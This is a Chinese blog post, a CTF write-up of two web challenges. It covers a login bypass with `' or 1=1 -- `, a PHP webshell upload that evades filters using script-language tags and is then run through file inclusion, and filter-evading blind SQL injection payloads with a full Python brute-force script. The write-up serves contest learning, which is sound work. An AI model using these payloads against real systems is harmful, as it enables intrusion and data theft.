---
title: NeSE十月升级赛WriteUp (Web)
date: 2022-10-03 10:39:12
categories:
  - CTF
---

学到了一些SQL注入的新姿势~

<!-- more -->

# ezweb

首先是一个登录页，随便输入后发现会显示出查询数据库的具体语句：

![](https://hujiekang.top/images/uploads/big/6ff42ed36128add8f8bc0cac22172992.png)

于是想到可能有注入，试了一下万能密码`admin' or 1=1 -- `，竟然成功进去了

登进去之后发现一个修改个人信息的功能点，可以上传头像：

![](https://hujiekang.top/images/uploads/big/f8df409d16f2d817a067eb7814042b63.png)

尝试传个一句话上去，但发现存在后缀名的黑名单，和PHP相关的后缀名不是被ban了就是没解析，其他格式也不会被解析。还搜了一下，PHP在FashCGI模式下，也支持类似Apache里面`.htaccess`的独立配置文件用法，可以在某个文件夹创建一个名为`.user.ini`的配置文件，该配置仅对当前目录生效。但后面又发现`.ini`也被ban了……所以也没法通过修改解析格式的方式来解析脚本了（具体`.user.ini`能不能修改解析方式也没有去深究，找个时间研究一下）

除此之外，发现文件内容也会被替换，比如`?`会被替换成`!`，使得PHP起始的标签没法构造：

![](https://hujiekang.top/images/uploads/big/41db4f0772adc51d311e95656fa8a058.png)

不过其他的过滤倒也没有，可以使用`<script language="php"></script>`来绕过PHP标签的过滤，来写入一句话。

一句话传上去了，接下来就想着怎么执行。因为无论怎么传也没法解析，黑名单也没法绕过，于是想到是不是可能有其他的包含点，翻源码翻来翻去，在用户列表的页面里找到了一个小提示，果然有包含点：

![](https://hujiekang.top/images/uploads/big/d928967e349dde25f06f1393d5caafd4.png)

![](https://hujiekang.top/images/uploads/big/856b21508eb92a704b2690d95edba24b.png)

然后就是直接包含上传的一句话，执行命令`cat /flagaaaaaaaaaaaa`拿到Flag：

![](https://hujiekang.top/images/uploads/big/4eb83dfb2e7110e1f1cf335cf1df7e42.png)

# sqli

一道很直白的SQL注入题，随便试了一下发现有报错，根据报错信息可以知道传参外面是包裹了一层单引号的。尝试了不少关键词都显示`hack`，于是首先fuzz了一下黑名单，发现过滤的有亿点多：

![](https://hujiekang.top/images/uploads/medium/6e4db6f7b25002a32d79657b4510d63b.png)

除去常见的关键字外，还过滤了下面这几类：

- 所有的空白字符，包括空格、`\n`、`\t`、`\x00`等；
- 所有的注释符（`//`除外但并不能注释成功）；
- `information_schema`；
- 逻辑运算`&&`、`||`、`OR`；
- 时间盲注相关：`sleep`、`benchmark`；
- 字符串截取函数`substr`、`substring`、`mid`、`left`、`right`；
- ……

对于空格的绕过，可以使用括号来括住表达式，这样可以不使用空格；但测试了一波之后，发现虽然`UNION SELECT`没有被过滤，但因为无法使用注释符，使得尾部的单引号无法被注释导致`UNION SELECT`无法构造成功。联合注入就走不通了。

遂尝试布尔盲注，首先子字符串的截取函数被ban，但又需要找到个办法来判断子字符串，翻了翻手册找到了`locate`函数，虽然没法截取字符串直接返回，但可以返回指定子字符串的索引值，似乎是个曲线救国的办法：

>*LOCATE(substr,str), LOCATE(substr,str,pos)*
>
>The first syntax returns the position of the first occurrence of substring `substr` in string `str`. The second syntax returns the position of the first occurrence of substring `substr` in string `str`, starting at position `pos`. Returns `0` if `substr` is not in `str`. Returns `NULL` if any argument is `NULL`. 
>
>This function is multibyte safe, and **is case-sensitive only if at least one argument is a binary string.**

如手册中所述，在传入普通字符串的时候，`locate`函数是大小写不敏感的，所以需要使用`binary`函数转换为二进制字符串来处理：

![](https://hujiekang.top/images/uploads/big/b103302814b191f607da186ec1abf807.png)

下一步就是想办法构造一个能够区分盲注是否成功的布尔状态。此时想到之前注释符中的`//`还可以用，因此尝试是否可以用除法运算来实现盲注，最终形成的拼接如下，发现可以正确返回`hello world`。可以将中间的`1`替换成想要盲注的表达式即可。

```sql
id=1'/1/'1
```

基于`locate`函数的特性，在找到子字符串时返回索引（从1开始），找不到则返回0，可以形成一个这样的判断逻辑：（假设要搜索第3位的字母）

```sql
/* 方法一：使用三个参数的locate函数可以避免重复字母引起的索引问题 */
id='3'/(select(locate(binary('<char>'),flag,3))from(flag))/'1'
/* 若对应字符是正确的，则locate一定返回3，此时3/3/1=1，id=1会返回hello world */
/* 若对应字符是错误的，则locate返回0或是一个比3大的值（在字符串后面搜索到了），此时整个表达式的返回值必然小于1（0.xxxxxx），故查询无法返回数据 */
/* 依次类推，下一轮搜索第4位的Payload： */
id='4'/(select(locate(binary('<char>'),flag,4))from(flag))/'1'

/* 方法二：代入目前已搜索到的字符串来保证结果的唯一性 */
id='1'/(select(locate(binary('fl<char>'),flag))from(flag))/'1'
/* 若对应字符是正确的，则locate一定返回1（因为代入的是从头开始的字符串），此时1/1/1=1，id=1会返回hello world */
/* 若对应字符是正确的，则locate一定返回0或者一个大于1的值，此时返回值为NULL或小于一，故查询无法返回数据 */
/* 依次类推，下一轮搜索第4位的Payload： */
id='1'/(select(locate(binary('fla<char>'),flag))from(flag))/'1'
```

这样可以保证搜索到结果返回值的唯一性，也就能够确定对应位置的字符是否正确。

除此之外，参考了下其他人的思路，还可以使用`strcmp`函数来创造这个布尔条件。但通过`strcmp`进行爆破要求字符需要按照ASCII从小到大排序，下面介绍具体思路：

```sql
/* 方法三：只使用strcmp函数，结合除法进行布尔盲注 */
id='1'/(strcmp((select(flag)from(flag)),binary('fl<char>')))/'1'
/* 在未搜索到末尾时，若传入的字母比正确对应的字母ASCII小或相等，则strcmp的判断返回为1，等同于id=1，返回hello world */
/* 若传入的字母比正确对应的字母ASCII要大，则strcmp的判断返回为-1，等同于id=-1，故查询无法返回数据 */
/* 在搜索到末尾时，若传入的字母匹配，此时strcmp的判断返回为0（已经完全等同了），故查询无法返回数据 */

/* 方法四：结合strcmp函数和pow函数，通过除零错误进行布尔盲注 */
id='1'and(pow(0,strcmp((select(flag)from(flag)),binary('fl<char>'))))and'1'
/* 在未搜索到末尾时，若传入的字母比正确对应的字母ASCII小或相等，则pow返回为0，等同于id=0，无法返回数据 */
/* 若传入的字母比正确对应的字母ASCII要大，则strcmp的判断返回为-1，此时pow相当于计算0的倒数，此时产生除0错误 */
/* 在搜索到末尾时，若传入的字母匹配，此时pow相当于计算0的0次方返回1，返回hello world */
```

还有需要注意的一点，在实际爆破的时候发现字母x和X是被过滤的，因此可以使用`char()`函数和`concat()`函数进行转换来绕过。下面是完整脚本：

```python
import requests
import string
from urllib.parse import quote

# Sorted char dictionary
DICTIONARY = string.digits + string.ascii_uppercase + "_" + string.ascii_lowercase + "{}"

URL = "http://124.16.75.162:31012/?id={}"
FLAG = "???????????????????????????????????"
PAYLOAD1 = "{}'/((select(locate(binary({}),flag,{}))from(flag)))/'1"
PAYLOAD2 = "1'/((select(locate(binary(concat({})),flag))from(flag)))/'1"
PAYLOAD3 = "1'/(strcmp((select(flag)from(flag)),binary(concat({}))))/'1"
PAYLOAD4 = "1'and(pow(0,strcmp((select(flag)from(flag)),binary(concat({})))))and'1"

def str2char(s: str):
    return ",".join(["char({})".format(ord(each)) for each in list(s)])

# Method 1 and 2
res = ""
for i in range(len(FLAG)):
    for d in DICTIONARY:
        print(res + d + "\033[1A\033[K")
        payload = PAYLOAD1.format(i + 1, str2char(d), i + 1)
        # payload = PAYLOAD2.format(str2char(res + d))
        r = requests.get(URL.format(quote(payload)))
        if len(r.text) == 144:
            res += d
            break

# Method 3 and 4
# Prerequisite: char dictionary needs to be sorted by ascii value (from low to high)
res = ""
for i in range(len(FLAG)):
    for j in range(len(DICTIONARY)):
        print(res + DICTIONARY[j] + "\033[1A\033[K")
        # Method 3
        payload = PAYLOAD3.format(str2char(res + DICTIONARY[j]))
        r = requests.get(URL.format(quote(payload)))
        if len(r.text) == 133:
            res += (DICTIONARY[j] if i == len(FLAG) - 1 else DICTIONARY[j - 1])
            break
        
        # Method 4
        # payload = PAYLOAD4.format(str2char(res + DICTIONARY[j]))
        # r = requests.get(URL.format(quote(payload)))
        # if "error 1690" in r.text: # Zero-divide error
        #     res += DICTIONARY[j - 1]
        #     break
        # elif "hello world" in r.text: # The last char
        #     res += DICTIONARY[j]
        #     break

print(f"Flag: {res}")
```

Flag：`flag{Fal5e_Sq1i_eX_5o_Inst3restin9}`（flag表是猜的，因为information_schema读不到hhh）

# Reference

- [PHP: .user.ini files - Manual](https://www.php.net/manual/en/configuration.file.per-user.php)
- [MySQL :: MySQL 8.0 Reference Manual :: 12.8 String Functions and Operators](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_locate)
